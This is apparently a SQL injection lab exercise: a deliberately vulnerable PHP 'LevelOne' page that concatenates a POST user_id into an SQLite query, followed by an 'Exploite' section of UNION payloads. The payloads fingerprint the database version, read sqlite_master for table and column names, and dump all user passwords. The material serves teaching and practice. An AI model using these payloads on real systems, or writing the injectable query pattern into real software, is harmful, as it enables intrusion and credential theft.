```php
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```

<details>
  <summary><b>Exploite</b></summary>

  ```sql
#Version
999999 union select 1,sqlite_version()--

#Table name
999999 union select 1,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- => users

#Column name
999999 union select 1,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--

#Extract data
999999 union select group_concat(password,'||'),2 FROM users--
  ```
</details>
